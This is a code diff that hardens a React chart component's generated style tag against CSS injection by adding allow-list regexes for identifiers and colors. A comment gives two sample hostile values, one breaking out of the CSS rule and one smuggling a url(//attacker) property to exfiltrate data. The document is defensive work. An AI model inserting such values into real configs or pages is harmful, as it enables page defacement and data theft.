@@ -67,6 +67,14 @@ const ChartContainer = React.forwardRef<
 })
 ChartContainer.displayName = "Chart"
 
+// Defense in depth — the values that land in this <style> tag come from
+// chart config which is ultimately agent-influenced. A crafted color
+// like `red; } body { display: none } /*` could escape the rule, and a
+// crafted key like `x; --evil: url(//attacker)` could exfil via CSS.
+// Restrict to safe identifier/color shapes before injecting.
+const SAFE_CSS_IDENT = /^[a-zA-Z_][a-zA-Z0-9_-]{0,63}$/
+const SAFE_CSS_COLOR = /^(?:#[0-9a-fA-F]{3,8}|(?:rgb|rgba|hsl|hsla|oklch|oklab)\([^);]+\)|[a-zA-Z]{3,30})$/
+
 const ChartStyle = ({ id, config }: { id: string; config: ChartConfig }) => {
   const colorConfig = Object.entries(config).filter(
     ([, config]) => config.theme || config.color
@@ -76,20 +84,28 @@ const ChartStyle = ({ id, config }: { id: string; config: ChartConfig }) => {
     return null
   }
 
+  // Validate id before splicing into a CSS selector. React.useId() never
+  // produces unsafe characters, but belt-and-suspenders.
+  const safeId = SAFE_CSS_IDENT.test(id) ? id : "x"
+
   return (
     <style
       dangerouslySetInnerHTML={{
         __html: Object.entries(THEMES)
           .map(
             ([theme, prefix]) => `
-${prefix} [data-chart=${id}] {
+${prefix} [data-chart=${safeId}] {
 ${colorConfig
   .map(([key, itemConfig]) => {
     const color =
       itemConfig.theme?.[theme as keyof typeof itemConfig.theme] ||
       itemConfig.color
-    return color ? `  --color-${key}: ${color};` : null
+    if (!color) return null
+    if (!SAFE_CSS_IDENT.test(key)) return null
+    if (!SAFE_CSS_COLOR.test(String(color))) return null
+    return `  --color-${key}: ${color};`
   })
+  .filter(Boolean)
   .join("\n")}
 }
 `
